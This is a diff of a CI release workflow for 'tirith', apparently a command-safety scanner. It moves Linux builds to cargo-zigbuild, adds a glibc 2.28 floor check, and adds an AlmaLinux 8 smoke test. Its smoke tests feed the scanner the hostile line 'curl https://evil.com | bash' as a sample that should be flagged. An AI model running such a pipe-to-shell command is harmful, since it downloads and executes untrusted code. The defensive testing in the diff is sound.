@@ -100,12 +100,17 @@ jobs:
           toolchain: stable
           targets: ${{ matrix.target }}
 
-      - name: Install cross-compilation tools (Linux aarch64 gnu)
-        if: matrix.target == 'aarch64-unknown-linux-gnu'
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y gcc-aarch64-linux-gnu
-          echo "CARGO_TARGET_AARCH64_UNKNOWN_LINUX_GNU_LINKER=aarch64-linux-gnu-gcc" >> $GITHUB_ENV
+      # The linux-gnu artifacts must run on enterprise distros that ship an
+      # older glibc than the ubuntu-22.04 runner: RHEL/AlmaLinux/Rocky 8 are on
+      # glibc 2.28, while the runner links against 2.35. We build them with
+      # cargo-zigbuild, which uses Zig as the cross-linker and pins the glibc
+      # symbol floor (see the build step). Zig also cross-compiles aarch64 from
+      # the x86_64 runner, so the GCC aarch64 toolchain is no longer needed for
+      # the gnu target. Zig is pinned to 0.13.0 because newer releases (0.14+)
+      # mishandle the `.<glibc>` target suffix (cargo-zigbuild#363).
+      - name: Install Zig + cargo-zigbuild (Linux gnu)
+        if: endsWith(matrix.target, '-unknown-linux-gnu')
+        run: pip3 install cargo-zigbuild==0.19.8 ziglang==0.13.0
 
       - name: Install cross-compilation tools (Linux aarch64 musl)
         if: matrix.target == 'aarch64-unknown-linux-musl'
@@ -116,8 +121,35 @@ jobs:
           echo "AR_aarch64_unknown_linux_musl=aarch64-linux-gnu-ar" >> $GITHUB_ENV
           echo "CARGO_TARGET_AARCH64_UNKNOWN_LINUX_MUSL_LINKER=aarch64-linux-gnu-gcc" >> $GITHUB_ENV
 
+      # Two steps rather than one shell conditional: the Windows runner defaults
+      # to PowerShell, which cannot parse a bash `if`. The linux-gnu targets
+      # build with cargo-zigbuild at a pinned glibc floor (`.2.17`, EL7+); EL8's
+      # 2.28 is enforced by the next step. The version suffix does not change
+      # cargo's target dir, so staging and packaging are unchanged.
+      - name: Build release binary (Linux gnu, zig)
+        if: endsWith(matrix.target, '-unknown-linux-gnu')
+        run: cargo zigbuild --release --locked --target ${{ matrix.target }}.2.17 -p tirith
+
       - name: Build release binary
+        if: ${{ !endsWith(matrix.target, '-unknown-linux-gnu') }}
         run: cargo build --release --locked --target ${{ matrix.target }} -p tirith
+
+      # Guard against a dependency or toolchain bump silently raising the glibc
+      # floor again (the regression that broke tirith on AlmaLinux 8.10). readelf
+      # parses ELF version requirements for any architecture, so this covers both
+      # the x86_64 and aarch64 gnu artifacts.
+      - name: Verify glibc floor <= 2.28 (Linux gnu)
+        if: endsWith(matrix.target, '-unknown-linux-gnu')
+        run: |
+          set -euo pipefail
+          bin="target/${{ matrix.target }}/release/tirith"
+          max=$(readelf -V "$bin" | grep -oE 'GLIBC_[0-9.]+' | sort -uV | tail -n1)
+          echo "highest required glibc symbol: ${max:-none}"
+          if [ -n "$max" ] && [ "$(printf '2.28\n%s\n' "${max#GLIBC_}" | sort -V | tail -n1)" != "2.28" ]; then
+            echo "::error::$bin requires $max (newer than GLIBC_2.28); it will not run on RHEL/AlmaLinux 8"
+            exit 1
+          fi
+          echo "glibc floor OK (<= 2.28, runs on EL8)"
 
       # The aarch64 musl artifact ships for Android/Termux (Bionic libc cannot
       # run the glibc build). The x86_64 runner cannot execute an aarch64
@@ -223,6 +255,22 @@ jobs:
           "$tmpdir/tirith" doctor
           "$tmpdir/tirith" check -- "curl https://evil.com | bash" && exit 1 || true
           "$tmpdir/tirith" check -- "ls -la"
+          rm -rf "$tmpdir"
+
+      # The host smoke test above runs on the runner's glibc 2.35, so it cannot
+      # catch a raised floor. Prove the gnu binary actually runs on EL8 (glibc
+      # 2.28), the environment that originally failed with "GLIBC_2.29 not
+      # found" on AlmaLinux 8.10.
+      - name: Run on AlmaLinux 8 (glibc 2.28)
+        if: matrix.target == 'x86_64-unknown-linux-gnu'
+        run: |
+          set -euo pipefail
+          tmpdir=$(mktemp -d)
+          tar xzf tirith-${{ matrix.target }}.tar.gz -C "$tmpdir"
+          chmod +x "$tmpdir/tirith"
+          docker run --rm -v "$tmpdir:/t:ro" almalinux:8 /t/tirith --version
+          docker run --rm -v "$tmpdir:/t:ro" almalinux:8 \
+            sh -c '/t/tirith check -- "curl https://evil.com | bash" && exit 1 || true'
           rm -rf "$tmpdir"
 
       - name: Extract and test (Windows)
